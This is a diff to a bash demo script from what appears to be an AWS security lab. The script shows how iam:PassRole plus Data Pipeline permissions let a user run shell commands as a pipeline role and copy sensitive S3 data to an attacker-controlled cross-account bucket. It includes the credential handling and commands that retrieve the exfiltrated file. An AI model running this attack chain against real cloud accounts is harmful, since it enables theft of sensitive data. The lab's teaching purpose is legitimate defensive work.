@@ -1,8 +1,10 @@
 #!/bin/bash
 
-# Demo script for iam:PassRole + Data Pipeline privilege escalation to S3 bucket
+# Demo script for iam:PassRole + Data Pipeline data exfiltration to S3 bucket
 # This script demonstrates how a user with iam:PassRole and Data Pipeline permissions
-# can exfiltrate S3 data using a read-only role by bypassing IAM via resource policy
+# can exfiltrate sensitive S3 data by passing a read-only role to a pipeline that runs
+# arbitrary shell commands on EC2 instances. The exfil bucket is attacker-controlled
+# infrastructure (deployed in the attacker account), not a victim misconfiguration.
 
 
 # Disable AWS CLI paging
@@ -41,7 +43,7 @@ PIPELINE_ROLE="pl-prod-datapipeline-001-to-bucket-pipeline-role"
 PIPELINE_NAME="pl-datapipeline-001-exfil-pipeline"
 
 echo -e "${GREEN}========================================${NC}"
-echo -e "${GREEN}Data Pipeline Resource Policy Bypass Privilege Escalation Demo${NC}"
+echo -e "${GREEN}Data Pipeline Data Exfiltration Demo${NC}"
 echo -e "${GREEN}========================================${NC}\n"
 
 # Step 1: Retrieve credentials and region from Terraform outputs
@@ -77,6 +79,21 @@ if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
     exit 1
 fi
 
+# Extract attacker account credentials (used to read from the attacker-controlled exfil bucket)
+ATTACKER_ACCESS_KEY=$(terraform output -raw attacker_admin_user_access_key_id 2>/dev/null || echo "")
+ATTACKER_SECRET_KEY=$(terraform output -raw attacker_admin_user_secret_access_key 2>/dev/null || echo "")
+
+if [ -n "$ATTACKER_ACCESS_KEY" ] && [ "$ATTACKER_ACCESS_KEY" != "null" ]; then
+    echo "Attacker account credentials found -- will use attacker account to read exfil bucket"
+    HAVE_ATTACKER_CREDS=true
+else
+    echo "No attacker account configured -- exfil bucket is in prod account (demo convenience mode)"
+    echo "Using prod admin credentials to read exfil bucket"
+    HAVE_ATTACKER_CREDS=false
+    ATTACKER_ACCESS_KEY=$(terraform output -raw prod_admin_user_for_cleanup_access_key_id 2>/dev/null || echo "")
+    ATTACKER_SECRET_KEY=$(terraform output -raw prod_admin_user_for_cleanup_secret_access_key 2>/dev/null || echo "")
+fi
+
 # Get region
 AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
 
@@ -105,6 +122,11 @@ use_starting_creds() {
 use_readonly_creds() {
     export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
     export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_attacker_creds() {
+    export AWS_ACCESS_KEY_ID="$ATTACKER_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$ATTACKER_SECRET_KEY"
     unset AWS_SESSION_TOKEN
 }
 
@@ -155,16 +177,19 @@ else
 fi
 echo ""
 
-# Step 5: Verify pipeline role has NO write permissions (optional verification)
-echo -e "${YELLOW}Step 5: Understanding the privilege escalation vector${NC}"
-echo "The pipeline role has:"
-echo "  - s3:GetObject on the sensitive bucket (READ-ONLY)"
-echo "  - NO s3:PutObject permissions in IAM"
+# Step 5: Explain the attack vector
+echo -e "${YELLOW}Step 5: Understanding the attack vector${NC}"
+echo "The victim misconfiguration:"
+echo "  - Starting user has iam:PassRole on the pipeline role"
+echo "  - Starting user has Data Pipeline permissions (CreatePipeline, PutPipelineDefinition, ActivatePipeline)"
+echo "  - Pipeline role has s3:GetObject on the sensitive bucket"
+echo "  - Together: an attacker can run arbitrary shell commands as the pipeline role"
+echo "    and read data from the sensitive bucket that they cannot access directly."
 echo ""
-echo "However, the exfiltration bucket has a resource policy that allows:"
-echo "  - ANY principal to write (bypassing IAM restrictions!)"
+echo "The attacker brings their own exfil bucket in a separate account."
+echo "Its resource policy grants the victim account permission to write to it."
 echo ""
-echo -e "${BLUE}This demonstrates how resource policies can bypass IAM restrictions${NC}"
+echo -e "${BLUE}The victim's only misconfiguration is the PassRole + Data Pipeline combination on the IAM side.${NC}"
 echo ""
 
 # [EXPLOIT] Step 6: Create Data Pipeline
@@ -189,7 +214,7 @@ echo -e "${YELLOW}Step 7: Creating pipeline definition with exfiltration command
 echo "Creating pipeline definition that will:"
 echo "  1. Launch an EC2 instance with the pipeline role"
 echo "  2. Copy sensitive data from $SENSITIVE_BUCKET"
-echo "  3. Write to $EXFIL_BUCKET (bypassing IAM via resource policy)"
+echo "  3. Write cross-account to attacker-controlled exfil bucket $EXFIL_BUCKET"
 echo ""
 
 # Create the pipeline definition JSON
@@ -293,14 +318,15 @@ echo -e "${GREEN}✓ Wait complete${NC}\n"
 
 # [OBSERVATION] Step 11: Verify exfiltration was successful
 echo -e "${YELLOW}Step 11: Verifying exfiltration was successful${NC}"
-use_readonly_creds
+use_attacker_creds
 export AWS_REGION=$AWS_REGION
-echo "Checking if the data was exfiltrated to the exfil bucket..."
+echo "Checking attacker-controlled exfil bucket for the exfiltrated file..."
 
 # First check if the file exists
-show_cmd "ReadOnly" "aws s3 ls s3://$EXFIL_BUCKET/exfiltrated.txt --region $AWS_REGION"
+IDENTITY_LABEL="Attacker"
+show_cmd "$IDENTITY_LABEL" "aws s3 ls s3://$EXFIL_BUCKET/exfiltrated.txt --region $AWS_REGION"
 if aws s3 ls s3://$EXFIL_BUCKET/exfiltrated.txt --region $AWS_REGION &> /dev/null; then
-    echo -e "${GREEN}✓ Exfiltrated file found in bucket!${NC}"
+    echo -e "${GREEN}✓ Exfiltrated file found in attacker-controlled bucket!${NC}"
     echo ""
 else
     echo -e "${YELLOW}⚠ Exfiltrated file not yet available. The pipeline may still be executing.${NC}"
@@ -313,21 +339,21 @@ fi
 
 # [OBSERVATION] Step 12: Read the exfiltrated data
 echo -e "${YELLOW}Step 12: Reading the exfiltrated sensitive data${NC}"
-use_readonly_creds
+use_attacker_creds
 export AWS_REGION=$AWS_REGION
-echo "Retrieving the exfiltrated file from: s3://$EXFIL_BUCKET/exfiltrated.txt"
+echo "Retrieving the exfiltrated file from attacker-controlled bucket: s3://$EXFIL_BUCKET/exfiltrated.txt"
 echo ""
 
-show_cmd "ReadOnly" "aws s3 cp s3://$EXFIL_BUCKET/exfiltrated.txt - --region $AWS_REGION"
+show_cmd "$IDENTITY_LABEL" "aws s3 cp s3://$EXFIL_BUCKET/exfiltrated.txt - --region $AWS_REGION"
 if aws s3 cp s3://$EXFIL_BUCKET/exfiltrated.txt - --region $AWS_REGION 2>/dev/null; then
     echo ""
     echo -e "${GREEN}✓ Successfully read exfiltrated sensitive data!${NC}"
-    echo -e "${GREEN}✓ BUCKET ACCESS ACHIEVED VIA RESOURCE POLICY BYPASS${NC}"
+    echo -e "${GREEN}✓ SENSITIVE DATA EXFILTRATED TO ATTACKER-CONTROLLED BUCKET${NC}"
 else
     echo -e "${YELLOW}⚠ Could not read exfiltrated data yet${NC}"
     echo "The pipeline execution may take longer. Check back in a few minutes."
     echo ""
-    echo "To manually check the exfiltration status:"
+    echo "To manually check the exfiltration status (using attacker account credentials):"
     echo "  aws s3 ls s3://$EXFIL_BUCKET/ --region $AWS_REGION"
     echo "  aws s3 cp s3://$EXFIL_BUCKET/exfiltrated.txt - --region $AWS_REGION"
 fi
@@ -341,31 +367,35 @@ rm -f /tmp/pipeline_definition.json /tmp/pipeline_put_result.json
 restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 
 echo -e "\n${GREEN}========================================${NC}"
-echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
+echo -e "${GREEN}✅ DATA EXFILTRATION SUCCESSFUL!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. Started as: $STARTING_USER (with iam:PassRole and Data Pipeline permissions)"
-echo "2. Created Data Pipeline with read-only S3 role: $PIPELINE_ROLE"
+echo "2. Created Data Pipeline with pipeline role: $PIPELINE_ROLE"
 echo "3. Pipeline launched EC2 instance with the role attached"
 echo "4. EC2 instance read sensitive data from: $SENSITIVE_BUCKET"
-echo "5. EC2 instance wrote to exfil bucket: $EXFIL_BUCKET"
-echo "6. Write succeeded despite role having NO IAM write permissions!"
-echo "7. Retrieved exfiltrated data from the exfil bucket"
-echo "8. Achieved: Access to sensitive bucket data"
+echo "   (pipeline role has s3:GetObject on the sensitive bucket via IAM)"
+echo "5. EC2 instance wrote data cross-account to attacker-controlled exfil bucket: $EXFIL_BUCKET"
+echo "   (attacker bucket policy grants the victim account write access)"
+echo "6. Retrieved exfiltrated data from the attacker-controlled exfil bucket"
+echo "7. Achieved: Sensitive data exfiltrated from a bucket the starting user cannot access directly"
 
 echo -e "\n${BLUE}Key Security Lesson:${NC}"
-echo "The pipeline role had s3:GetObject (READ-ONLY) permissions in IAM."
-echo "However, the exfiltration bucket's RESOURCE POLICY allowed writes."
-echo "Resource policies can BYPASS IAM restrictions!"
+echo "The victim's only misconfiguration is on the IAM side: a user with iam:PassRole"
+echo "on a role that has read access to sensitive data, combined with Data Pipeline"
+echo "permissions. That combination lets an attacker run arbitrary shell commands as"
+echo "the pipeline role and read data they cannot access directly."
 echo ""
-echo -e "${RED}This demonstrates why both IAM policies AND resource policies must be secured.${NC}"
+echo "The exfil bucket is attacker-controlled infrastructure -- not a victim misconfiguration."
+echo ""
+echo -e "${RED}Detect and restrict iam:PassRole to specific services and specific role ARNs.${NC}"
 
 echo -e "\n${YELLOW}Attack Path:${NC}"
 echo -e "  $STARTING_USER → (CreatePipeline + PassRole)"
-echo -e "  → Data Pipeline with $PIPELINE_ROLE (read-only S3 in IAM)"
+echo -e "  → Data Pipeline with $PIPELINE_ROLE (s3:GetObject on sensitive bucket)"
 echo -e "  → EC2 Instance → Read from $SENSITIVE_BUCKET"
-echo -e "  → Write to $EXFIL_BUCKET (bypassing IAM via resource policy)"
-echo -e "  → Exfiltrated sensitive data accessed"
+echo -e "  → Write cross-account to attacker bucket $EXFIL_BUCKET"
+echo -e "  → Sensitive data exfiltrated"
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     echo -e "\n${YELLOW}Attack Commands:${NC}"
@@ -384,7 +414,7 @@ echo -e "\n${RED}⚠ Warning: The Data Pipeline and EC2 instance may still be ac
 echo -e "${RED}⚠ Active pipelines and EC2 instances incur charges${NC}"
 echo ""
 echo -e "${YELLOW}To clean up and restore the original state:${NC}"
-echo "  ./cleanup_attack.sh"
+echo "  ./cleanup_attack.sh or use the plabs TUI/CLI"
 echo ""
 
 # Mark demo as active for plabs tracking
